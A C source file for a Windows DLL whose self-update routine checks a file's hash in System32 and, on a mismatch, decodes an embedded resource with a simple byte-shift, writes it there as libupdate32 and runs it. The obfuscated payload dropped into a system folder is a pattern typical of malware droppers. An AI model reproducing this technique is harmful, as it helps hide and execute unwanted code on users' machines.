#include "execute.h"
#include <khopanstring.h>
#include "resource.h"

static HINSTANCE globalInstance;

BOOL CheckAndProcessSelfUpdate(cJSON* root) {
	if(!cJSON_HasObjectItem(root, "self")) {
		return TRUE;
	}

	cJSON* selfObject = cJSON_GetObjectItem(root, "self");

	if(!cJSON_HasObjectItem(selfObject, "url")) {
		return TRUE;
	}

	LPWSTR pathFolderWindows = KHWin32GetWindowsDirectoryW();

	if(!pathFolderWindows) {
		return TRUE;
	}

	LPWSTR pathFolderSystem32 = KHFormatMessageW(L"%ws\\" FOLDER_SYSTEM32, pathFolderWindows);
	LocalFree(pathFolderWindows);

	if(!pathFolderSystem32) {
		return TRUE;
	}

	LPWSTR pathFileLibdll32 = KHFormatMessageW(L"%ws\\" FILE_LIBDLL32, pathFolderSystem32);

	if(!pathFileLibdll32) {
		LocalFree(pathFolderSystem32);
		return TRUE;
	}

	BOOL result = CheckFileHash(selfObject, pathFileLibdll32);
	LocalFree(pathFileLibdll32);

	if(result) {
		MessageBoxW(NULL, L"Hash match", L"libdll32", MB_OK | MB_ICONINFORMATION | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
		LocalFree(pathFolderSystem32);
		return TRUE;
	}

	HRSRC resourceHandle = FindResourceW(globalInstance, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);

	if(!resourceHandle) {
		LocalFree(pathFolderSystem32);
		return TRUE;
	}

	DWORD resourceSize = SizeofResource(globalInstance, resourceHandle);

	if(!resourceSize) {
		LocalFree(pathFolderSystem32);
		return TRUE;
	}

	HGLOBAL resource = LoadResource(globalInstance, resourceHandle);

	if(!resource) {
		LocalFree(pathFolderSystem32);
		return TRUE;
	}

	BYTE* data = LockResource(resource);

	if(!data) {
		LocalFree(pathFolderSystem32);
		return TRUE;
	}

	BYTE* buffer = LocalAlloc(LMEM_FIXED, resourceSize);

	if(!buffer) {
		LocalFree(pathFolderSystem32);
		return TRUE;
	}

	for(DWORD i = 0; i < resourceSize; i++) {
		buffer[i] = (data[i] - 18) % 0xFF;
	}

	LPWSTR pathFileLibupdate32 = KHFormatMessageW(L"%ws\\" FILE_LIBUPDATE32, pathFolderSystem32);
	LocalFree(pathFolderSystem32);

	if(!pathFileLibupdate32) {
		LocalFree(buffer);
		return TRUE;
	}

	HANDLE file = CreateFileW(pathFileLibupdate32, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if(file == INVALID_HANDLE_VALUE) {
		LocalFree(pathFileLibupdate32);
		LocalFree(buffer);
		return TRUE;
	}

	DWORD bytesWritten;
	result = WriteFile(file, buffer, resourceSize, &bytesWritten, NULL);
	LocalFree(buffer);

	if(!result) {
		LocalFree(pathFileLibupdate32);
		return TRUE;
	}

	if(!CloseHandle(file)) {
		LocalFree(pathFileLibupdate32);
		return TRUE;
	}

	LPWSTR argumentFileLibupdate32 = KHFormatMessageW(L"%lu", GetCurrentProcessId());

	if(!argumentFileLibupdate32) {
		LocalFree(pathFileLibupdate32);
		return TRUE;
	}

	KHWin32StartDynamicLibraryW(pathFileLibupdate32, FUNCTION_LIBUPDATE32, argumentFileLibupdate32);
	LocalFree(argumentFileLibupdate32);
	LocalFree(pathFileLibupdate32);
	MessageBoxW(NULL, L"Hash not match", L"libdll32", MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
	return FALSE;
}

BOOL WINAPI DllMain(HINSTANCE instance, DWORD reason, LPVOID reserved) {
	globalInstance = instance;
	return TRUE;
}
